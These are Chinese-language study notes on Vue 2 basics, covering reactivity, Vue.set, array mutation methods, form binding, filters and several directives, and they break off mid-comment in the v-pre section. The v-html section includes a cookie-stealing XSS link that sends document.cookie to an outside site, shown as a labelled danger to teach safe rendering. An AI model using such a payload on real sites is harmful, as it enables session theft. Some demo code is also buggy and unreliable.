          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>更新时的一个问题</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h2>人员列表</h2>
    <!--v-model双向绑定-->
    <button @click="updateM">更新马冬梅信息</button>
    <ul v-for="p in persons" :key="p.id">
        <li>{{p.name}}-{{ p.age }}- {{ p.sex }}</li>
    </ul>
</div>
<script type="text/javascript">
    const  vm = new Vue({
        el:'#root',
        data: {
            persons: [
                {id: "001", name:'周冬雨', age:20, sex:'女'},
                {id: "002", name:'马冬梅', age:19, sex:'女'},
                {id: "003", name:'周杰伦', age:21, sex:'男'},
                {id: "004", name:'温兆伦', age:22, sex: '男'},
            ],
        },
        methods:{
            updateM(){
                // this.persons[1].name = '马老师';  //奏效
                // this.persons[1].age = 50;      //奏效
                // this.persons[1].sex = '男'; //奏效
                // this.persons[1] = { id: '002', name: '马老师', age: 50, sex:'男' }; //这样修改vue是无法监测数据的
                this.persons.splice(1,1,{ id: '002', name: '马老师', age: 50, sex:'男' });
            }

        }
    });
</script>
</body>
</html>
```

---

### Vue如何检测数据变化

Vue如何检测对象数据变化？

讲解视频

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=34&vd_source=2eee47d702302407e4fd46a6edc82d55

![image](8952068870454F31B5EE3E570AC22E25)

模拟对对象中数据进行检测

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<script>
			let data = {
				name: 'mike'
			}
			// 出错
			Object.defineProperty(data, 'name', {
				get() {
					return data.name
				}
				set(val) {
					data.name = val
				}
			})
		</script>
	</body>
</html>
```

监视对象数据变化

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<script>
			let data = {
				name: 'mike'
			}
			
			function Observer(obj) {
				// obj代表传入对象
				// 得到对象中所有的属性
				const keys = Object.keys(obj)
				// 遍历
				keys.forEach((key) => {
					Object.defineProperty(this, key, {
						get() {
							return obj[k]
						}
						set(newVal) {
							console.log('属性被修改，重新生成模板')
							obj[k] = newVal
						}
					})
				})
			}
			// 创建监测对象，用于检测实例中数据变化
			const obj = new Observer()
			
			let vm = {}
			vm._data = obj
			
			// 此后vm._data被修改后，调用set函数
		</script>
	</body>
</html>
```

但是下面这种情形下，修改vm._data.a.b时出错。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<script>
			let data = {
				name: 'mike',
				a : {
					b: 1
				}
			}
			
			function Observer(obj) {
				// obj代表传入对象
				// 得到对象中所有的属性
				const keys = Object.keys(obj)
				// 遍历
				keys.forEach((key) => {
					Object.defineProperty(this, key, {
						get() {
							return obj[k]
						}
						set(newVal) {
							console.log('属性被修改，重新生成模板')
							obj[k] = newVal
						}
					})
				})
			}
			// 创建监测对象，用于检测实例中数据变化
			const obj = new Observer()
			
			let vm = {}
			vm._data = obj
			
			// 此后vm._data被修改后，调用set函数
		</script>
	</body>
</html>
```

而Vue在监视数据时，使用递归来监视数据对象中各个属性的变化。

![image](4F1759DD5ABC4635843744B9025C96DB)

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root"></div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          address: "earch",
          student: {
            name: "jack",
            age: 20,
          },
        },
      });
    </script>
  </body>
</html>
```
![image](1094CD49A8D54F35941C4D3F8A976620)

数据中的每一个数据均有get和set方法。

---

如果我们希望后面给vm对象中的student添加一个性别属性。

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      姓名：<h2>{{name}}</h2>
      地址：<h2>{{address}}</h2>
      性别：<h2>{{sex}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          address: "earch",
          student: {
            name: "jack",
            age: 20,
          },
        },
      });
    </script>
  </body>
</html>
```

如果我们使用vm._data.student.sex = '男'，页面不会更新。

![image](BBF350673A26471A900496434A0871B8)

vm._data.student有sex属性，但是没有对应的get和set方法，不会导致无法更新页面。

Vue提供了一个API给Vue中的对象添加属性

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      姓名：
      <h2>{{name}}</h2>
      地址：
      <h2>{{address}}</h2>
      性别：
      <h2>{{student.sex}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          address: "earch",
          student: {
            name: "jack",
            age: 20,
          },
        },
      });
      // 向vm对象中添加属性，添加属性后，页面会进行更新
      vm.$set(vm._data.student, "sex", "男");
    </script>
  </body>
</html>
```

另一种写法

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      姓名：
      <h2>{{name}}</h2>

      地址：
      <h2>{{address}}</h2>

      <button @click="addSex">点击添加性别</button>

      性别：
      <h2>{{student.sex}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          address: "earch",
          student: {
            name: "jack",
            age: 20,
          },
        },
        methods: {
          addSex() {
            Vue.set(this.student, "sex", "男");
          },
        },
      });
    </script>
  </body>
</html>
```

另一种写法

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>姓名：{{name}}</h2>

      <h2>地址：{{address}}</h2>

      <button @click="addSex">点击添加性别</button>

      <h2 v-if="student.sex">性别：{{student.sex}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          address: "earch",
          student: {
            name: "jack",
            age: 20,
          },
        },
        methods: {
          addSex() {
            Vue.set(this.student, "sex", "男");
          },
        },
      });
    </script>
  </body>
</html>
```
---

### Vue如何检测数组数据变化

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <ul>
        <li v-for="(h, index) in hobby">{{h}}</li>
      </ul>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          hobby: ["喝酒", "烫头"],
        },
      });
    </script>
  </body>
</html>
```

![image](48EC0BE279184FB4BC1A2F4BBE79D42E)

这里Vue没有为数组中每一个元素设置get和set方法，而是给数组增加了get和set方法，所有修改数组中索引的值不会触发页面更新。

这里是因为

![image](0E7F712CBF31470EACFE7739D6EBDF7F)

数组中常见的操作方法会对数据进行修改，会触发页面更新。

![image](9F6F035B5E3248B9885CEFF4BE798D84)

```
<!doctype html>
<html lang="en">
<head>
    <!--
       通过包裹数组更新元素的方法实现，本质就是做了两件事：
			    (1).调用原生对应的方法对数组进行更新。
				(2).重新解析模板，进而更新页面。
	   在Vue修改数组中的某个元素一定要用如下方法：
			   1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
			   2.Vue.set() 或 vm.$set()
    -->
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue监测数据改变的原理_数组</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>学校信息</h1>
    <h2>学校名称:{{ name }}</h2>
    <h2>学校地址:{{ address }}</h2>
    <hr/>
    <h1>学生信息</h1>
    <button @click.once="addSex">添加一个性别属性,默认值是男</button>
    <h2>学生姓名:{{ stu.name }}</h2>
    <h2>学生真实年龄:{{ stu.age.rage }}</h2>
    <h2>学生对外年龄:{{ stu.age.sage}}</h2>
    <h2 v-if="stu.sex">学生性别: {{ stu.sex }}</h2>
    <h2>朋友们</h2>
     <ul v-for="(f, index) in stu.friends" :key="index">
         <li>{{ f.name }} -- {{ f.age }}</li>
     </ul>
    <h2>爱好</h2>
    <!--
      Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：
      push()
      pop()
      shift()
      unshift()
      splice()
      sort()
      reverse()
    -->
    <ul v-for="(h, index) in stu.hobbies" :key="index">
        <li>{{ h }}</li>
    </ul>
</div>
<script type="text/javascript">
    const vm = new Vue({
         el: '#root',
         data:{
             name: '武汉科技大学',
             address: '武汉',
             stu:{
                 name: 'tom',
                 age:{
                     rage: 12,
                     sage: 29
                 },
                 hobbies: ['抽烟', '喝酒', '烫头'],
                 friends: [
                     { name: 'Jerry', age: 23 },
                     { name: 'Jane', age: 18 }
                 ]
             }
         },
        methods:{
            addSex(){
                //这里this === vm
                //利用vue.set(或者vm.$set())api能够添加的属性变为响应式属性
                //注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。
                Vue.set(this.stu, 'sex', '男')
                // this.$set(this.stu, 'sex', '男');
            },
        }
     })
</script>
</body>
</html>
```

---

### 总结监视数据

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>总结vue数据监视</title>
    <style>
        button{
            margin-bottom: 10px;
        }
    </style>
    <script src="../js/vue.js"></script>

</head>
<body>
<div id="root">
    <!--
			Vue监视数据的原理：
				1. vue会监视data中所有层次的数据。

				2. 如何监测对象中的数据？
						通过setter实现监视，且要在new Vue时就传入要监测的数据。
						(1).对象中后追加的属性，Vue默认不做响应式处理
						(2).如需给后添加的属性做响应式，请使用如下API：
										Vue.set(target，propertyName/index，value) 或
									    vm.$set(target，propertyName/index，value)

				3. 如何监测数组中的数据？
									通过包裹数组更新元素的方法实现，本质就是做了两件事：
										(1).调用原生对应的方法对数组进行更新。
										(2).重新解析模板，进而更新页面。

				4.在Vue修改数组中的某个元素一定要用如下方法：
							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
							2.Vue.set() 或 vm.$set()

				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
			    注: 数据劫持可以理解成为vue对你写在data的数据会进行加工，让它们都变成响应式的
		-->
    <h1>学生信息</h1>
    <button @click="student.age++">年龄+1岁</button> <br/>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
    <button @click="student.sex = '未知' ">修改性别</button> <br/>
    <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
    <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
    <button @click="addHobby">添加一个爱好</button> <br/>
    <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>

</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
       el: '#root',
       data:{
           student:{
               name:'tom',
               age:18,
               hobby:['抽烟','喝酒','烫头'],
               friends:[
                   {name:'jerry',age:35},
                   {name:'tony',age:36}
               ]
           }
       },
       methods:{
           addSex(){
               this.$set(this.student, 'sex', '男');
           },
           addFriend(){
               this.student.friends.unshift({
                   name:'jack',
                   age:70,
               })
           },
           updateFirstFriendName(){
               this.student.friends[0].name = '张三'
           },
           addHobby(){
               this.student.hobby.push('学习');
           },
           updateHobby(){
               // this.student.hobby.splice(0,1,'开车');
               this.$set(this.student.hobby, 0, '开车');
           },
           removeSmoke(){
               //直接替换
               this.student.hobby = this.student.hobby.filter(h => h !== '抽烟');
           }
       }
    });
</script>
</body>
</html>
```

---

### 收集表单数据

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue中表单数据的收集</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			收集表单数据：
					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
					若：<input type="checkbox"/>
							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
							2.配置input的value属性:
									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
					备注：v-model的三个修饰符：
									lazy：失去焦点再收集数据
									number：输入字符串转为有效的数字
									trim：输入首尾空格过滤
		-->
    <form @submit.prevent="demo">
        <!--写了label则点击它也能使指定的input获取焦点 for属性的值为指定元素的id-->
        <label for="demo">账号:</label>
        <!--v-model主要用来双向绑定输入类表单value值-->
        <input type="text" id="demo" v-model.trim="userInfo.account"/>
        <br/>
        密码: <input type="password" v-model="userInfo.password"/>
        <br/>
        性别:
        <!--一组radio单选框的name值一定要相同 设置value值好让v-model去双向绑定-->
        男:<input type="radio" v-model="userInfo.sex" name="sex" value="male"/>
        女:<input type="radio" v-model="userInfo.sex" name="sex" value="female"/>
        <br/>
        年龄: <input type="number" v-model.number="userInfo.age"/>
        <br/>
        爱好:
        <!--如果没有value值则v-model收集checked元素-->
        学习 <input v-model="userInfo.hobby" type="checkbox" value="study"/>
        打游戏 <input v-model="userInfo.hobby" type="checkbox" value="game"/>
        吃饭 <input v-model="userInfo.hobby" type="checkbox" value="eat" />
        <br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="Beijing">北京</option>
            <option value="Shanghai">上海</option>
            <option value="Shenzhen">深圳</option>
            <option value="Wuhan">武汉</option>
        </select>
        <br/>
        其他信息<textarea v-model.lazy="userInfo.other"></textarea>
        <br/>
        <input type="checkbox" v-model="userInfo.ifAgree"/>阅读并接受<a href="https://www.google.com.tw">《用户协议》</a>
        <button>提交数据</button>
    </form>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data:{
            userInfo:{
                account: '',
                password: '',
                sex: 'male',
                age:'',
                hobby:[],
                city:'',
                other:'',
                ifAgree:''
            }
        },
        methods:{
            demo(){
                //json转换为string
                console.log(JSON.stringify(this.userInfo));
            }
        }
    })
</script>
</body>
</html>
```

---

### 过滤器

对时间进行可视化处理

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>现在是：{{fmtTime}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        computed: {
          fmtTime() {
            // 格式化时间
            return dayjs(this.time).format("YYYY-MM-DD--HH:MM:SS");
          },
        },
      });
    </script>
  </body>
</html>
```

methods实现

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>现在是：{{getFmtTime()}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        methods: {
          getFmtTime() {
            // 格式化时间
            return dayjs(this.time).format("YYYY-MM-DD--HH:MM:SS");
          },
        },
      });
    </script>
  </body>
</html>
```

过滤器实现

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>现在是：{{time | getFmtTime}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        filters: {
          getFmtTime(value) {
            // 格式化时间
            return dayjs(value).format("YYYY-MM-DD--HH:MM:SS");
          },
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      // 传参
      <h2>现在是：{{time | getFmtTime('YYYY_MM_DD')}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        filters: {
          getFmtTime(value, str) {
            // 格式化时间
            return dayjs(value).format(str);
          },
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>现在是：{{time | getFmtTime('YYYY_MM_DD') | sliceStr}}</h2>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        filters: {
          getFmtTime(value, str) {
            // 格式化时间
            return dayjs(value).format(str);
          },
          sliceStr(value) {
            return value.slice(0, 4);
          },
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <h2>现在是：{{time | getFmtTime('YYYY_MM_DD') | sliceStr}}</h2>
    </div>
    <script>
      // 全局定义过滤器
      Vue.filter('sliceStr',function(value) {
        return value.slice(0,4)
      })
      const vm = new Vue({
        el: "#root",
        data: {
          time: 111111111,
        },
        filters: {
          getFmtTime(value, str) {
            // 格式化时间
            return dayjs(value).format(str);
          }
        },
      });
    </script>
  </body>
</html>
```

![image](E54B052D932C4C8B9D085DBE4B47849F)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue中过滤器</title>
    <script src="../js/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
</head>
<body>
<div id="root">
    <!--
			过滤器：
				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
				语法：
						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
				备注：
						1.过滤器也可以接收额外参数、多个过滤器也可以串联
						2.并没有改变原本的数据, 是产生新的对应的数据
     -->
    <h1>显示格式化后的时间</h1>
    <!--计算属性实现-->
    <h2>现在是:{{ fmtTime }}</h2>
    <!--methods实现-->
    <h2>现在是{{ getFmtTime() }}</h2>
    <!--过滤器实现-->
    <h2>现在是:{{ time |  timeFormater }}</h2>
    <!--过滤器也可以传递参数-->
    <h2>现在是:{{ time | timeFormater('YYYY-MM-DD') | mySlice }}</h2>
    <h3 :x="msg | mySlice">你好,世界</h3>
</div>
<div id="root2">
   <h2>{{ msg | mySlice }}</h2>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    //全局过滤器的配置
    //注意配置一定要new vue实例之前确定
    Vue.filter('mySlice', function (val){
        return val.slice(0,4);
    });
    new Vue({
        el: "#root",
        data:{
            time: 1631808423062,
            msg: "你好，世界"
        },
        computed:{
            fmtTime(){
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
            }
        },
        methods:{
            getFmtTime(){
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            //过滤器本质上也是一个函数
            timeFormater(val, formate = 'YYYY-MM-DD HH:mm:ss'){
                return dayjs(val).format(formate)
            },
        }
    });

    const vm2 = new Vue({
        el:"#root2",
        data:{
            msg:'welcome'
        }
    })
</script>
</body>
</html>
```

---

### v-text命令

![image](7AE622170CEE4ED58CAD957A832B11C0)

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <div>{{name}}</div>
      <!-- v-text后面值充当div中的文本内容 -->
      <div v-text="name"></div>
      <div v-text="str"></div>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          name: "mike",
          str: "<h3>你好</h3>",
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <div v-html="str"></div>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          str: "<h3>你好</h3>",
        },
      });
    </script>
  </body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>v-text指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
   我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
   v-text指令：
						1.作用：向其所在的节点中渲染文本内容。 (纯文本渲染)
						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。这里有点不太灵活

-->
<div id="root">
    {{ name }}
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data:{
          name:'上海',
          //注意v-text不会解析标签，而是直接将标签当纯文本解析
          str:'<h1>hello, shanghai</h1>'
        }
    })
</script>
</body>
</html>
```

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
    <div v-text="name"></div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: "#root",
        data:{
            name:'上海',
            //注意v-html会解析标签，这点与v-text不一样
            str:'<h1>hello, shanghai</h1>',
            //危险行为 永远不要相信用户的输入
            str2:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了兄弟</a>'
        }
    })
</script>
</body>
</html>
```

---

### v-cloak命令

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>v-cloak指令</title>
    <style>
        [v-cloak]{
            display:none;
        }
    </style>
    <!-- 引入Vue -->
</head>
<body>
<!--
        v-cloak指令（没有值）：
                1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
                2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
-->
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</body>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
</html>
```

---

### v-once指令

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <div>{{n}}</div>
      <button @click="n++">点我加1</button>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          n: 1,
        },
      });
    </script>
  </body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <div v-once>{{n}}</div>
      <div>{{n}}</div>
      <button @click="n++">点我加1</button>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          n: 1,
        },
      });
    </script>
  </body>
</html>
```

![image](B27F6700CD1C4AE5894FA9A26488987A)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>v-once指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--v-once-->
    <!--
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
	-->
    <h2 v-once>初始化n的值为:{{ n }}</h2>
    <h2>当前的n值为:{{ n }}</h2>
    <button @click="n++">带我n+1</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el:"#root",
        data:{
           n:1
        }
    })
</script>
</body>
</html>
```

---

### v-pre指令

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="./Vue/vue.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <title>Document</title>
    <style></style>
  </head>
  <body>
    <div id="root">
      <div v-pre>Vue很简单</div>
      <div v-pre>{{n}}</div>
      <div>{{n}}</div>
      <button @click="n++">点我加1</button>
    </div>
    <script>
      const vm = new Vue({
        el: "#root",
        data: {
          n: 1,
        },
      });
    </script>
  </body>
</html>
```

![image](513C0F58FFC14283A0803DEEEF1DB745)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>v-pre指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			v-pre指令：
					1.跳过其所在节点的编译过程。
